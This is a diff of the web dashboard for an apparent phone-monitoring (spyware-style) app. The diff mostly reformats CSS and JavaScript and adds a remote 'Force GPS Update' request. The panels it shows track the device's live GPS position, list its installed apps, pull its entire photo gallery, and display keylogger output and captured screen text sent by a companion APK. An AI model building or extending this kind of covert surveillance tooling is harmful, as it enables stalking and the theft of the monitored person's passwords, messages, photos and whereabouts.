@@ -366,7 +366,7 @@ body {
     word-break: break-all;
 }
 
-/* ===== GALLERY SPECIFIC STYLES ===== */
+/* Gallery Specific */
 .gallery-content {
     margin: 20px;
     padding: 0;
@@ -599,73 +599,27 @@ body {
 
 /* Responsive */
 @media(max-width: 900px) {
-    .gps-stats {
-        grid-template-columns: repeat(2, 1fr);
-    }
-    .apps {
-        grid-template-columns: repeat(2, 1fr);
-    }
-    .media-grid, .skeleton-grid {
-        grid-template-columns: repeat(3, 1fr);
-    }
-    .gallery-controls {
-        gap: 8px;
-    }
+    .gps-stats { grid-template-columns: repeat(2, 1fr); }
+    .apps { grid-template-columns: repeat(2, 1fr); }
+    .media-grid, .skeleton-grid { grid-template-columns: repeat(3, 1fr); }
+    .gallery-controls { gap: 8px; }
 }
 
 @media(max-width: 600px) {
-    .header {
-        flex-wrap: wrap;
-        height: auto;
-        padding: 10px;
-    }
-    .nav {
-        overflow-x: auto;
-        width: 100%;
-        order: 3;
-    }
-    .device-id {
-        margin-left: auto;
-    }
-    .container {
-        padding: 10px;
-    }
-    .gps-stats {
-        grid-template-columns: repeat(2, 1fr);
-        gap: 10px;
-    }
-    .map-container {
-        height: 350px;
-        margin: 0 10px 10px 10px;
-    }
-    .controls {
-        gap: 6px;
-        overflow-x: auto;
-        flex-wrap: nowrap;
-    }
-    .control-btn {
-        padding: 8px 12px;
-        white-space: nowrap;
-    }
-    .panel-header {
-        flex-direction: column;
-        align-items: flex-start;
-    }
-    .media-grid, .skeleton-grid {
-        grid-template-columns: repeat(2, 1fr);
-    }
-    .gallery-controls {
-        flex-direction: column;
-        align-items: flex-start;
-    }
-    .gallery-controls select {
-        width: 100%;
-    }
+    .header { flex-wrap: wrap; height: auto; padding: 10px; }
+    .nav { overflow-x: auto; width: 100%; order: 3; }
+    .device-id { margin-left: auto; }
+    .container { padding: 10px; }
+    .gps-stats { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+    .map-container { height: 350px; margin: 0 10px 10px 10px; }
+    .controls { gap: 6px; overflow-x: auto; flex-wrap: nowrap; }
+    .control-btn { padding: 8px 12px; white-space: nowrap; }
+    .panel-header { flex-direction: column; align-items: flex-start; }
+    .media-grid, .skeleton-grid { grid-template-columns: repeat(2, 1fr); }
+    .gallery-controls { flex-direction: column; align-items: flex-start; }
+    .gallery-controls select { width: 100%; }
     .gallery-controls .refresh-btn,
-    .gallery-controls .force-btn {
-        width: 100%;
-        margin-top: 4px;
-    }
+    .gallery-controls .force-btn { width: 100%; margin-top: 4px; }
 }
 </style>
 </head>
@@ -679,9 +633,7 @@ body {
         <button onclick="location.href='/dashboard'">⌂ Home</button>
         <button onclick="location.href='/dashboard'">← Dashboard</button>
     </div>
-    <div class="device-id" id="deviceIdDisplay">
-        DEVICE ID: <b>child-phone-123</b>
-    </div>
+    <div class="device-id" id="deviceIdDisplay">DEVICE ID: <b>child-phone-123</b></div>
     <div class="live">● LIVE LINK</div>
 </header>
 
@@ -713,36 +665,19 @@ body {
                 <div class="panel-title">📍 Live GPS Location Tracker</div>
                 <div class="panel-subtitle">Real-time GPS coordinates and live interactive map explorer.</div>
             </div>
-            <button class="force-btn" id="forceGpsBtn" onclick="forceGpsUpdate()">
-                ➤ Force GPS Update
-            </button>
+            <button class="force-btn" id="forceGpsBtn" onclick="forceGpsUpdate()">➤ Force GPS Update</button>
         </div>
 
         <div class="gps-stats">
-            <div class="stat-card">
-                <div class="stat-label">LATITUDE</div>
-                <div class="stat-value" id="latValue">--.-------</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">LONGITUDE</div>
-                <div class="stat-value" id="lngValue">--.-------</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">ACCURACY</div>
-                <div class="stat-value green" id="accuracyValue">-- m</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">LAST UPDATE</div>
-                <div class="stat-value" id="lastUpdateValue">Never</div>
-            </div>
+            <div class="stat-card"><div class="stat-label">LATITUDE</div><div class="stat-value" id="latValue">--.-------</div></div>
+            <div class="stat-card"><div class="stat-label">LONGITUDE</div><div class="stat-value" id="lngValue">--.-------</div></div>
+            <div class="stat-card"><div class="stat-label">ACCURACY</div><div class="stat-value green" id="accuracyValue">-- m</div></div>
+            <div class="stat-card"><div class="stat-label">LAST UPDATE</div><div class="stat-value" id="lastUpdateValue">Never</div></div>
         </div>
 
         <div class="map-container">
             <div id="map"></div>
-            <div class="map-overlay" id="mapOverlay" style="display:none;">
-                <div class="spinner"></div>
-                <span id="mapOverlayText">Requesting GPS location...</span>
-            </div>
+            <div class="map-overlay" id="mapOverlay" style="display:none;"><div class="spinner"></div><span id="mapOverlayText">Requesting GPS location...</span></div>
         </div>
     </section>
 
@@ -776,27 +711,15 @@ body {
                 <button class="force-btn" onclick="fetchGalleryPhotos(true)">☁ Fetch All Gallery Photos</button>
             </div>
 
-            <div class="gallery-section-title">
-                ⚡ Latest Synced Photos
-                <span class="badge" id="latestCountBadge">0</span>
-            </div>
-            <div id="latestGalleryGrid" class="media-grid">
-                <!-- dynamic -->
-            </div>
+            <div class="gallery-section-title">⚡ Latest Synced Photos <span class="badge" id="latestCountBadge">0</span></div>
+            <div id="latestGalleryGrid" class="media-grid"></div>
 
-            <div class="gallery-section-title">
-                🗂 All Gallery Photos
-                <span class="badge" id="allCountBadge">0</span>
-            </div>
-            <div id="allGalleryGrid" class="media-grid">
-                <!-- dynamic -->
-            </div>
+            <div class="gallery-section-title">🗂 All Gallery Photos <span class="badge" id="allCountBadge">0</span></div>
+            <div id="allGalleryGrid" class="media-grid"></div>
+
             <div id="galleryLoading" style="display:none;">
                 <div class="skeleton-grid">
-                    <div class="skeleton-card"></div>
-                    <div class="skeleton-card"></div>
-                    <div class="skeleton-card"></div>
-                    <div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div><div class="skeleton-card"></div>
                 </div>
                 <p style="text-align:center;color:#888;">Fetching gallery photos...</p>
             </div>
@@ -832,9 +755,7 @@ body {
 <!-- Modal Viewer -->
 <div class="modal-viewer" id="mediaModal">
     <button class="modal-close" onclick="closeMediaViewer()">×</button>
-    <div class="modal-content" id="mediaModalContent">
-        <!-- dynamic -->
-    </div>
+    <div class="modal-content" id="mediaModalContent"></div>
     <div class="modal-nav">
         <button onclick="prevMedia()">‹ Prev</button>
         <button onclick="nextMedia()">Next ›</button>
@@ -842,15 +763,12 @@ body {
 </div>
 
 <script>
-
 // ================== CONFIG ==================
-const DEFAULT_CENTER = [23.8103, 90.4125]; // Dhaka, Bangladesh
+const DEFAULT_CENTER = [23.8103, 90.4125];
 const DEFAULT_ZOOM = 13;
 let map;
 let marker = null;
 let currentDeviceId = getDeviceId();
-
-// Gallery state
 let galleryItems = [];
 let currentMediaIndex = -1;
 
@@ -859,14 +777,8 @@ function getDeviceId() {
     const params = new URLSearchParams(window.location.search);
     return params.get("deviceId") || "child-phone-123";
 }
-
 function escapeHtml(value) {
-    return String(value)
-        .replaceAll("&", "&amp;")
-        .replaceAll("<", "&lt;")
-        .replaceAll(">", "&gt;")
-        .replaceAll('"', "&quot;")
-        .replaceAll("'", "&#039;");
+    return String(value).replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;").replaceAll('"',"&quot;").replaceAll("'","&#039;");
 }
 
 // ================== LOCALSTORAGE HELPERS ==================
@@ -874,29 +786,18 @@ function getLastKnownLocation(deviceId) {
     const key = "lastGpsLocation_" + deviceId;
     const stored = localStorage.getItem(key);
     if (stored) {
-        try {
-            return JSON.parse(stored);
-        } catch (e) {
-            return null;
-        }
+        try { return JSON.parse(stored); } catch (e) { return null; }
     }
     return null;
 }
-
 function saveLastKnownLocation(deviceId, location) {
-    const key = "lastGpsLocation_" + deviceId;
-    localStorage.setItem(key, JSON.stringify(location));
+    localStorage.setItem("lastGpsLocation_" + deviceId, JSON.stringify(location));
 }
 
 // ================== MAP INIT ==================
 function initMap() {
     if (map) return;
-    map = L.map('map', {
-        center: DEFAULT_CENTER,
-        zoom: DEFAULT_ZOOM,
-        zoomControl: true
-    });
-
+    map = L.map('map', { center: DEFAULT_CENTER, zoom: DEFAULT_ZOOM, zoomControl: true });
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '&copy; OpenStreetMap contributors',
         maxZoom: 19
@@ -904,14 +805,13 @@ function initMap() {
 }
 
 // ================== MARKER HELPERS ==================
-function createOrUpdateMarker(lat, lng, popupContent, isFresh = true) {
+function createOrUpdateMarker(lat, lng, popupContent) {
     const icon = L.divIcon({
         className: 'custom-marker',
         html: '<div style="background:#ff3439; width:14px; height:14px; border-radius:50%; border:2px solid #fff; box-shadow:0 0 10px #ff3439;"></div>',
         iconSize: [18, 18],
         iconAnchor: [9, 9]
     });
-
     if (!marker) {
         marker = L.marker([lat, lng], { icon }).addTo(map);
     } else {
@@ -920,12 +820,8 @@ function createOrUpdateMarker(lat, lng, popupContent, isFresh = true) {
     }
     marker.bindPopup(popupContent).openPopup();
 }
-
 function removeMarker() {
-    if (marker) {
-        map.removeLayer(marker);
-        marker = null;
-    }
+    if (marker) { map.removeLayer(marker); marker = null; }
 }
 
 // ================== OVERLAY HELPERS ==================
@@ -935,20 +831,16 @@ function showOverlayWithSpinner(text) {
     if (overlay && textEl) {
         overlay.innerHTML = `<div class="spinner"></div><span>${text}</span>`;
         overlay.style.display = "flex";
-        overlay.style.borderColor = "#ff3d42";
     }
 }
-
 function showOverlayText(text) {
     const overlay = document.getElementById("mapOverlay");
     const textEl = document.getElementById("mapOverlayText");
     if (overlay && textEl) {
         overlay.innerHTML = `<span>${text}</span>`;
         overlay.style.display = "flex";
-        overlay.style.borderColor = "#ff3d42";
     }
 }
-
 function hideOverlay() {
     const overlay = document.getElementById("mapOverlay");
     if (overlay) overlay.style.display = "none";
@@ -958,32 +850,20 @@ function hideOverlay() {
 async function loadDeviceInfo(showLoadingOverlay = false) {
     const deviceId = getDeviceId();
     document.getElementById("deviceIdDisplay").innerHTML = `DEVICE ID: <b>${escapeHtml(deviceId)}</b>`;
-
-    if (showLoadingOverlay) {
-        showOverlayWithSpinner("Requesting GPS location...");
-    }
-
+    if (showLoadingOverlay) showOverlayWithSpinner("Requesting GPS location...");
     try {
         const response = await fetch(`/api/device-state?deviceId=${deviceId}`);
         if (!response.ok) throw new Error("Failed to fetch device state");
         const data = await response.json();
-
         document.getElementById("deviceName").textContent = "📱 " + (data.deviceName || "Unknown Device");
         document.getElementById("batteryLevel").textContent = data.battery ?? 0;
-
         const isOnline = data.last_seen && Date.now() - data.last_seen < 120000;
         document.getElementById("deviceStatusText").textContent = isOnline ? "Online" : "Offline";
         document.getElementById("deviceStatusText").className = isOnline ? "online-dot" : "";
-
-        if (document.getElementById("installedAppsList")) {
-            renderInstalledApps(data.installedApps || []);
-        }
-
+        if (document.getElementById("installedAppsList")) renderInstalledApps(data.installedApps || []);
         updateGPSData(data);
-
         hideOverlay();
         return data;
-
     } catch (e) {
         console.error(e);
         document.getElementById("deviceName").textContent = "📱 Error loading device info";
@@ -1004,47 +884,37 @@ function updateGPSData(data) {
     const lng = data.longitude ?? null;
     const accuracy = data.accuracy ?? null;
     const timestamp = data.last_seen ? new Date(data.last_seen) : new Date();
-
     if (lat !== null && lng !== null) {
-        const locationObj = { latitude: lat, longitude: lng, accuracy: accuracy, timestamp: timestamp.getTime() };
+        const locationObj = { latitude: lat, longitude: lng, accuracy, timestamp: timestamp.getTime() };
         saveLastKnownLocation(deviceId, locationObj);
-
         document.getElementById("latValue").textContent = lat.toFixed(6);
         document.getElementById("lngValue").textContent = lng.toFixed(6);
         document.getElementById("accuracyValue").textContent = accuracy !== null ? accuracy + " m" : "-- m";
         document.getElementById("lastUpdateValue").textContent = timestamp.toLocaleTimeString();
-
-        const popupContent = `<b>CURRENT LOCATION</b><br>Latitude: ${lat.toFixed(6)}<br>Longitude: ${lng.toFixed(6)}${accuracy ? `<br>Accuracy: ${accuracy} m` : ''}<br>Updated: ${timestamp.toLocaleTimeString()}`;
-        createOrUpdateMarker(lat, lng, popupContent, true);
+        const popup = `<b>CURRENT LOCATION</b><br>Latitude: ${lat.toFixed(6)}<br>Longitude: ${lng.toFixed(6)}${accuracy ? `<br>Accuracy: ${accuracy} m` : ''}<br>Updated: ${timestamp.toLocaleTimeString()}`;
+        createOrUpdateMarker(lat, lng, popup);
         map.setView([lat, lng], 15);
         hideOverlay();
         return;
     }
-
     const lastKnown = getLastKnownLocation(deviceId);
     if (lastKnown && lastKnown.latitude !== undefined && lastKnown.longitude !== undefined) {
-        const latVal = lastKnown.latitude;
-        const lngVal = lastKnown.longitude;
-        const accVal = lastKnown.accuracy ?? null;
+        const latVal = lastKnown.latitude, lngVal = lastKnown.longitude, accVal = lastKnown.accuracy ?? null;
         const lastTime = lastKnown.timestamp ? new Date(lastKnown.timestamp) : new Date();
-
         document.getElementById("latValue").textContent = latVal.toFixed(6);
         document.getElementById("lngValue").textContent = lngVal.toFixed(6);
         document.getElementById("accuracyValue").textContent = accVal !== null ? accVal + " m" : "-- m";
         document.getElementById("lastUpdateValue").textContent = lastTime.toLocaleTimeString();
-
-        const popupContent = `<b>LAST KNOWN LOCATION</b><br>Latitude: ${latVal.toFixed(6)}<br>Longitude: ${lngVal.toFixed(6)}${accVal !== null ? `<br>Accuracy: ${accVal} m` : ''}<br>Last updated: ${lastTime.toLocaleTimeString()}`;
-        createOrUpdateMarker(latVal, lngVal, popupContent, false);
+        const popup = `<b>LAST KNOWN LOCATION</b><br>Latitude: ${latVal.toFixed(6)}<br>Longitude: ${lngVal.toFixed(6)}${accVal !== null ? `<br>Accuracy: ${accVal} m` : ''}<br>Last updated: ${lastTime.toLocaleTimeString()}`;
+        createOrUpdateMarker(latVal, lngVal, popup);
         map.setView([latVal, lngVal], 15);
         showOverlayText("GPS currently unavailable • Showing last known location");
         return;
     }
-
     document.getElementById("latValue").textContent = "--.-------";
     document.getElementById("lngValue").textContent = "--.-------";
     document.getElementById("accuracyValue").textContent = "-- m";
     document.getElementById("lastUpdateValue").textContent = "Never";
-
     removeMarker();
     map.setView(DEFAULT_CENTER, DEFAULT_ZOOM);
     showOverlayText("Waiting for GPS location...");
@@ -1053,16 +923,8 @@ function updateGPSData(data) {
 function renderInstalledApps(apps) {
     const container = document.getElementById("installedAppsList");
     if (!container) return;
-    if (apps.length === 0) {
-        container.innerHTML = `<div class="app">No apps found</div>`;
-        return;
-    }
-    container.innerHTML = apps.map(app => `
-        <div class="app">
-            <div class="app-name">${escapeHtml(app.name)}</div>
-            <div class="package">${escapeHtml(app.package)}</div>
-        </div>
-    `).join("");
+    if (apps.length === 0) { container.innerHTML = `<div class="app">No apps found</div>`; return; }
+    container.innerHTML = apps.map(app => `<div class="app"><div class="app-name">${escapeHtml(app.name)}</div><div class="package">${escapeHtml(app.package)}</div></div>`).join("");
 }
 
 // ================== GALLERY FUNCTIONS ==================
@@ -1070,46 +932,30 @@ async function fetchGalleryPhotos(fetchAll = false) {
     const deviceId = getDeviceId();
     const countSelect = document.getElementById("galleryCountSelect");
     const count = fetchAll ? 10000 : parseInt(countSelect.value);
-
-    const latestGrid = document.getElementById("latestGalleryGrid");
-    const allGrid = document.getElementById("allGalleryGrid");
     const loading = document.getElementById("galleryLoading");
     const errorDiv = document.getElementById("galleryError");
     const errorText = document.getElementById("galleryErrorText");
-
-    latestGrid.innerHTML = '';
-    allGrid.innerHTML = '';
+    document.getElementById("latestGalleryGrid").innerHTML = '';
+    document.getElementById("allGalleryGrid").innerHTML = '';
     errorDiv.style.display = 'none';
     loading.style.display = 'block';
-
     try {
-        // Step 1: Request APK to fetch gallery
         await fetch(`/api/gallery/request`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ deviceId })
         });
-
-        // Step 2: Wait for APK to upload (poll /api/gallery)
         let media = [];
-        for (let i = 0; i < 8; i++) { // try 8 times, every 2 sec = 16 sec
+        for (let i = 0; i < 8; i++) {
             await new Promise(resolve => setTimeout(resolve, 2000));
             const res = await fetch(`/api/gallery?deviceId=${deviceId}&count=${count}`);
             if (!res.ok) throw new Error('Failed to fetch gallery');
             const data = await res.json();
-            if (data && data.media && data.media.length > 0) {
-                media = data.media;
-                break;
-            }
+            if (data && data.media && data.media.length > 0) { media = data.media; break; }
         }
-
-        if (media.length === 0) {
-            throw new Error('No media received');
-        }
-
+        if (media.length === 0) throw new Error('No media received');
         galleryItems = media;
         renderGalleryGrids();
-
     } catch (e) {
         console.error(e);
         errorText.textContent = "Unable to load gallery. Make sure APK is connected and permissions granted.";
@@ -1118,152 +964,73 @@ async function fetchGalleryPhotos(fetchAll = false) {
         loading.style.display = 'none';
     }
 }
-
 function renderGalleryGrids() {
-    const latestGrid = document.getElementById("latestGalleryGrid");
-    const allGrid = document.getElementById("allGalleryGrid");
-    const latestBadge = document.getElementById("latestCountBadge");
-    const allBadge = document.getElementById("allCountBadge");
-
-    const latestItems = galleryItems.slice(0, 10);
-    const allItems = galleryItems;
-
-    latestBadge.textContent = latestItems.length;
-    allBadge.textContent = allItems.length;
-
-    latestGrid.innerHTML = latestItems.map((item, index) => createMediaCard(item, index)).join('');
-    allGrid.innerHTML = allItems.map((item, index) => createMediaCard(item, index)).join('');
+    const latest = galleryItems.slice(0, 10);
+    document.getElementById("latestCountBadge").textContent = latest.length;
+    document.getElementById("allCountBadge").textContent = galleryItems.length;
+    document.getElementById("latestGalleryGrid").innerHTML = latest.map((item, i) => createMediaCard(item, i)).join('');
+    document.getElementById("allGalleryGrid").innerHTML = galleryItems.map((item, i) => createMediaCard(item, i)).join('');
 }
-
 function createMediaCard(item, index) {
     const type = item.type || 'image';
     const thumb = item.thumbnailBase64 ? `data:image/jpeg;base64,${item.thumbnailBase64}` : '';
     const filename = item.filename || 'Unknown';
     const timestamp = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
     const size = item.size ? formatFileSize(item.size) : 'Unknown';
-
-    return `
-        <div class="media-card" onclick="openMediaViewer(${index})">
-            <div class="media-type-badge">${type === 'video' ? '▶' : '📷'}</div>
-            ${thumb ? `<img src="${thumb}" class="media-thumb" alt="${escapeHtml(filename)}">` : `<div class="media-thumb" style="display:flex;align-items:center;justify-content:center;color:#666;">No Thumb</div>`}
-            <div class="media-info">
-                <div class="media-filename">${escapeHtml(filename)}</div>
-                <div class="media-meta">${timestamp} • ${size}</div>
-            </div>
-        </div>
-    `;
+    return `<div class="media-card" onclick="openMediaViewer(${index})">
+        <div class="media-type-badge">${type === 'video' ? '▶' : '📷'}</div>
+        ${thumb ? `<img src="${thumb}" class="media-thumb">` : `<div class="media-thumb" style="display:flex;align-items:center;justify-content:center;color:#666;">No Thumb</div>`}
+        <div class="media-info"><div class="media-filename">${escapeHtml(filename)}</div><div class="media-meta">${timestamp} • ${size}</div></div>
+    </div>`;
 }
-
 function formatFileSize(bytes) {
     if (!bytes) return '0 B';
-    const k = 1024;
-    const sizes = ['B','KB','MB','GB'];
+    const k = 1024, sizes = ['B','KB','MB','GB'];
     const i = Math.floor(Math.log(bytes) / Math.log(k));
     return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
 }
-
 function openMediaViewer(index) {
     if (index < 0 || index >= galleryItems.length) return;
     currentMediaIndex = index;
-    const modal = document.getElementById('mediaModal');
-    const content = document.getElementById('mediaModalContent');
     const item = galleryItems[index];
-
-    let html = '';
     const thumb = item.thumbnailBase64 ? `data:image/jpeg;base64,${item.thumbnailBase64}` : '';
-    if (item.type === 'video') {
-        html = `<video controls src="${thumb}" style="max-width:100%;max-height:80vh;"></video>`;
-    } else {
-        html = `<img src="${thumb}" alt="${escapeHtml(item.filename)}">`;
-    }
-
-    content.innerHTML = html;
-    modal.classList.add('active');
+    document.getElementById("mediaModalContent").innerHTML = item.type === 'video' ? `<video controls src="${thumb}"></video>` : `<img src="${thumb}">`;
+    document.getElementById("mediaModal").classList.add('active');
 }
-
-function closeMediaViewer() {
-    document.getElementById('mediaModal').classList.remove('active');
-}
-
-function prevMedia() {
-    if (galleryItems.length === 0) return;
-    currentMediaIndex = (currentMediaIndex - 1 + galleryItems.length) % galleryItems.length;
-    openMediaViewer(currentMediaIndex);
-}
-
-function nextMedia() {
-    if (galleryItems.length === 0) return;
-    currentMediaIndex = (currentMediaIndex + 1) % galleryItems.length;
-    openMediaViewer(currentMediaIndex);
-}
+function closeMediaViewer() { document.getElementById("mediaModal").classList.remove('active'); }
+function prevMedia() { if (galleryItems.length) { currentMediaIndex = (currentMediaIndex - 1 + galleryItems.length) % galleryItems.length; openMediaViewer(currentMediaIndex); } }
+function nextMedia() { if (galleryItems.length) { currentMediaIndex = (currentMediaIndex + 1) % galleryItems.length; openMediaViewer(currentMediaIndex); } }
 
 // ================== TABS ==================
-function setActiveTab(btn) {
-    document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active"));
-    btn.classList.add("active");
-}
-
-function showApps(btn) {
-    setActiveTab(btn);
-    document.getElementById("appsPanel").style.display = "block";
-    document.getElementById("gpsPanel").style.display = "none";
-    document.getElementById("galleryPanel").style.display = "none";
-    document.getElementById("keylogPanel").style.display = "none";
-    document.getElementById("screenPanel").style.display = "none";
-    loadDeviceInfo();
-}
-
-function showGPS(btn) {
-    setActiveTab(btn);
-    document.getElementById("appsPanel").style.display = "none";
-    document.getElementById("gpsPanel").style.display = "block";
-    document.getElementById("galleryPanel").style.display = "none";
-    document.getElementById("keylogPanel").style.display = "none";
-    document.getElementById("screenPanel").style.display = "none";
-    loadDeviceInfo();
-    setTimeout(() => { if (map) map.invalidateSize(); }, 100);
-}
-
-function showGallery(btn) {
-    setActiveTab(btn);
-    document.getElementById("appsPanel").style.display = "none";
-    document.getElementById("gpsPanel").style.display = "none";
-    document.getElementById("galleryPanel").style.display = "block";
-    document.getElementById("keylogPanel").style.display = "none";
-    document.getElementById("screenPanel").style.display = "none";
-    // Auto fetch when tab opened
-    fetchGalleryPhotos(false);
-}
-
-function showKeylog(btn) {
-    setActiveTab(btn);
-    document.getElementById("appsPanel").style.display = "none";
-    document.getElementById("gpsPanel").style.display = "none";
-    document.getElementById("galleryPanel").style.display = "none";
-    document.getElementById("keylogPanel").style.display = "block";
-    document.getElementById("screenPanel").style.display = "none";
-    refreshKeylog();
-}
-
-function showScreenData(btn) {
-    setActiveTab(btn);
-    document.getElementById("appsPanel").style.display = "none";
-    document.getElementById("gpsPanel").style.display = "none";
-    document.getElementById("galleryPanel").style.display = "none";
-    document.getElementById("keylogPanel").style.display = "none";
-    document.getElementById("screenPanel").style.display = "block";
-    refreshScreenData();
-}
+function setActiveTab(btn) { document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); }
+function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("screenPanel").style.display = "none"; loadDeviceInfo(); }
+function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("screenPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
+function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("screenPanel").style.display = "none"; fetchGalleryPhotos(false); }
+function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; document.getElementById("screenPanel").style.display = "none"; refreshKeylog(); }
+function showScreenData(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("screenPanel").style.display = "block"; refreshScreenData(); }
 
 // ================== FORCE GPS UPDATE ==================
 async function forceGpsUpdate() {
     const btn = document.getElementById("forceGpsBtn");
+    const deviceId = getDeviceId();
     btn.disabled = true;
     btn.innerHTML = '⟳ Requesting...';
     try {
-        await loadDeviceInfo(true);
+        await fetch('/api/gps/request', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId })
+        });
+        let received = false;
+        for (let i = 0; i < 8; i++) {
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            const data = await loadDeviceInfo();
+            if (data && data.latitude && data.longitude) { received = true; break; }
+        }
+        if (!received) alert('GPS response not received yet. Make sure APK is online.');
     } catch (e) {
-        // error already handled
+        console.error(e);
+        alert('GPS request failed.');
     } finally {
         btn.disabled = false;
         btn.innerHTML = '➤ Force GPS Update';
@@ -1279,22 +1046,10 @@ async function refreshKeylog() {
         const response = await fetch(`/api/keylog?deviceId=${deviceId}`);
         if (!response.ok) throw new Error("Failed");
         const logs = await response.json();
-        if (logs.length === 0) {
-            container.innerHTML = "No keylogs yet.";
-            return;
-        }
-        container.innerHTML = logs.map(log => `
-            <div class="keylog-entry">
-                ${escapeHtml(log.text)}
-                <span class="keylog-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
-            </div>
-        `).join("");
-    } catch (e) {
-        console.error(e);
-        container.innerHTML = "Error loading keylogs.";
-    }
+        if (logs.length === 0) { container.innerHTML = "No keylogs yet."; return; }
+        container.innerHTML = logs.map(log => `<div class="keylog-entry">${escapeHtml(log.text)}<span class="keylog-time">${new Date(log.timestamp).toLocaleTimeString()}</span></div>`).join("");
+    } catch (e) { console.error(e); container.innerHTML = "Error loading keylogs."; }
 }
-
 async function refreshScreenData() {
     const deviceId = getDeviceId();
     const content = document.getElementById("screenTextContent");
@@ -1303,21 +1058,15 @@ async function refreshScreenData() {
         if (!response.ok) throw new Error("Failed");
         const data = await response.json();
         content.textContent = data.uiText || "No screen data yet.";
-    } catch (e) {
-        console.error(e);
-        content.textContent = "Error loading screen data.";
-    }
+    } catch (e) { console.error(e); content.textContent = "Error loading screen data."; }
 }
 
 // ================== INIT ==================
 function init() {
     initMap();
     loadDeviceInfo();
-    setInterval(() => {
-        loadDeviceInfo();
-    }, 30000);
+    setInterval(() => { loadDeviceInfo(); }, 30000);
 }
-
 init();
 </script>
 
